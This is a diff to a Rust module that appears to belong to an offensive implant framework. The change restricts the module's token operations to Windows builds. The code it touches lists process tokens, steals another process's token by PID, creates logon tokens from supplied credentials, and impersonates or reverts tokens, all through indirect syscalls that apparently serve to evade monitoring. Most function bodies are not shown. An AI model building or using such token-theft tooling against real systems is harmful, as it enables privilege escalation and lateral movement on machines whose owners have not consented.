@@ -2,6 +2,7 @@
 //!
 //! ABI (shared with `libra-load`): `module_main(input, input_len, output, cap)`.
 //! All token operations go through `libra-syscalls` indirect syscalls.
+//! Windows-only：非 Windows 平台返回明确的不可用错误（libra_syscalls 的 nt_* 仅 Windows 存在）。
 
 #![allow(non_snake_case)]
 
@@ -32,8 +33,9 @@ const LOGON32_PROVIDER_WINNT50: u32 = 3;
 /// `NtCurrentThread()` / `NtCurrentProcess()` 伪句柄。
 const CURRENT_THREAD: Handle = usize::MAX - 1;
 
-// ── advapi32 FFI ───────────────────────────────────────────────────────
+// ── advapi32 FFI（Windows 专用）────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 #[link(name = "advapi32")]
 extern "system" {
     fn LogonUserW(
@@ -47,6 +49,7 @@ extern "system" {
     fn ConvertSidToStringSidW(sid: *const u8, string: *mut *mut u16) -> i32;
 }
 
+#[cfg(target_os = "windows")]
 #[link(name = "kernel32")]
 extern "system" {
     fn LocalFree(mem: *mut core::ffi::c_void) -> usize;
@@ -115,38 +118,48 @@ pub unsafe extern "system" fn module_main(
 }
 
 fn dispatch(input: &str) -> String {
-    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
-    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");
+    #[cfg(not(target_os = "windows"))]
+    {
+        // libra_syscalls 的 nt_* 仅 Windows 存在，非 Windows 直接返回不可用。
+        return r#"{"success":false,"error":"token module is windows-only"}"#.to_string();
+    }
+    #[cfg(target_os = "windows")]
+    {
+        let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
+        let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");
 
-    match op {
-        "list" => list(),
-        "steal" => {
-            let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
-            steal(pid)
+        match op {
+            "list" => list(),
+            "steal" => {
+                let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
+                steal(pid)
+            }
+            "make" => {
+                let user = v.get("username").and_then(|s| s.as_str()).unwrap_or("");
+                let pass = v.get("password").and_then(|s| s.as_str()).unwrap_or("");
+                let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");
+                make(user, domain, pass)
+            }
+            "impersonate" => {
+                let id = v.get("id").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
+                let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
+                impersonate(id, pid)
+            }
+            "revert" => revert(),
+            _ => r#"{"error":"unknown token op"}"#.to_string(),
         }
-        "make" => {
-            let user = v.get("username").and_then(|s| s.as_str()).unwrap_or("");
-            let pass = v.get("password").and_then(|s| s.as_str()).unwrap_or("");
-            let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");
-            make(user, domain, pass)
-        }
-        "impersonate" => {
-            let id = v.get("id").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
-            let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
-            impersonate(id, pid)
-        }
-        "revert" => revert(),
-        _ => r#"{"error":"unknown token op"}"#.to_string(),
     }
 }
 
-// ── 辅助 ───────────────────────────────────────────────────────────────
+// ── 辅助（Windows 专用实现；非 Windows 走 lib.rs 顶部的平台分支）──────
 
+#[cfg(target_os = "windows")]
 fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
 /// 枚举系统句柄表里的所有唯一 PID。
+#[cfg(target_os = "windows")]
 fn enum_pids() -> Vec<u32> {
     unsafe {
         // 句柄表大小不定，按 ReturnLength 动态扩容重试。
@@ -183,6 +196,7 @@ fn enum_pids() -> Vec<u32> {
 }
 
 /// 打开进程的主 token。
+#[cfg(target_os = "windows")]
 unsafe fn open_process_token(pid: u32) -> Option<Handle> {
     let client = ClientId::for_process(pid);
     let oa = ObjectAttributes::empty();
@@ -210,6 +224,7 @@ unsafe fn open_process_token(pid: u32) -> Option<Handle> {
 }
 
 /// 查询 token 所属用户，返回 `DOMAIN\user` 或 SID 字符串。
+#[cfg(target_os = "windows")]
 unsafe fn token_username(token: Handle) -> String {
     // TOKEN_USER 结构：{ SID_AND_ATTRIBUTES { SID*, Attributes } }
     let mut buf = [0u8; 256];
@@ -241,8 +256,9 @@ unsafe fn token_username(token: Handle) -> String {
     "(no sid)".to_string()
 }
 
-// ── op 实现 ────────────────────────────────────────────────────────────
+// ── op 实现（Windows 专用；非 Windows 由 dispatch 直接拒绝）────────────
 
+#[cfg(target_os = "windows")]
 fn list() -> String {
     let pids = enum_pids();
     let mut out = Vec::new();
@@ -259,6 +275,7 @@ fn list() -> String {
     serde_json::json!({ "success": true, "tokens": out }).to_string()
 }
 
+#[cfg(target_os = "windows")]
 fn steal(pid: u32) -> String {
     if pid == 0 {
         return r#"{"success":false,"error":"pid required"}"#.to_string();
@@ -282,6 +299,7 @@ fn steal(pid: u32) -> String {
     .to_string()
 }
 
+#[cfg(target_os = "windows")]
 fn make(username: &str, domain: &str, password: &str) -> String {
     unsafe {
         let user_w = wide(username);
@@ -319,6 +337,7 @@ fn make(username: &str, domain: &str, password: &str) -> String {
     }
 }
 
+#[cfg(target_os = "windows")]
 fn impersonate(id: u32, pid: u32) -> String {
     // 优先按 id 从 vault 选；否则按 pid 现偷。
     let (handle, _username) = {
@@ -342,6 +361,7 @@ fn impersonate(id: u32, pid: u32) -> String {
 }
 
 /// 模拟一个 token 到当前线程（ReactOS SysImpersonateLoggedOnUser 的简化移植）。
+#[cfg(target_os = "windows")]
 unsafe fn impersonate_token(token: Handle) -> bool {
     // 判断 token 类型
     let mut ty = 0u32;
@@ -394,6 +414,7 @@ unsafe fn impersonate_token(token: Handle) -> bool {
     s == 0
 }
 
+#[cfg(target_os = "windows")]
 fn revert() -> String {
     unsafe {
         let null: usize = 0;
@@ -407,7 +428,7 @@ fn revert() -> String {
     }
 }
 
-#[cfg(test)]
+#[cfg(all(test, target_os = "windows"))]
 mod tests {
     use super::*;
 
